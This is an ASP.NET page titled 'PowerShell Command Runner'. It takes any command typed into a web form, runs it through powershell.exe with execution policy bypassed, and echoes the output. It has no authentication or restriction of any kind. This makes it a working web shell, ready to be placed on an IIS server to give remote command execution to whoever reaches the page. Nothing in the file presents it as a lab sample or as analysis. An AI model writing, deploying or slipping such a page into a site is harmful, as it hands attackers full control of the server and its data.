<%@ Page Language="C#" %>
<!DOCTYPE html>
<html>
<head>
    <title>PowerShell Command Runner</title>
    <style>
        body {
            font-family: Consolas, monospace;
            background-color: #1e1e1e;
            color: #00ff00;
            padding: 40px;
        }
        #container {
            max-width: 800px;
            margin: auto;
            background: #2e2e2e;
            padding: 20px;
            border-radius: 10px;
        }
        textarea, input, button {
            width: 100%;
            margin-top: 10px;
        }
        textarea {
            height: 300px;
            background: black;
            color: #0f0;
            padding: 10px;
            border: none;
            resize: none;
        }
        input {
            padding: 10px;
            font-size: 16px;
        }
        button {
            background: #007acc;
            color: white;
            padding: 10px;
            font-size: 16px;
            border: none;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div id="container">
        <h2>PowerShell Command Runner</h2>
        <form method="post">
            <input type="text" name="pscommand" placeholder="Enter PowerShell command (e.g. Get-Process)" />
            <button type="submit">Run</button>
        </form>
        <textarea readonly>
<%
    if (IsPostBack && !string.IsNullOrWhiteSpace(Request.Form["pscommand"]))
    {
        string cmd = Request.Form["pscommand"];
        try
        {
            System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo();
            psi.FileName = "powershell.exe";
            psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command \"" + cmd.Replace("\"", "\\\"") + "\"";
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;

            using (System.Diagnostics.Process process = System.Diagnostics.Process.Start(psi))
            {
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();
                Response.Write(Server.HtmlEncode(output + error));
            }
        }
        catch (Exception ex)
        {
            Response.Write(Server.HtmlEncode("Exception: " + ex.Message));
        }
    }
%>
        </textarea>
    </div>
</body>
</html>
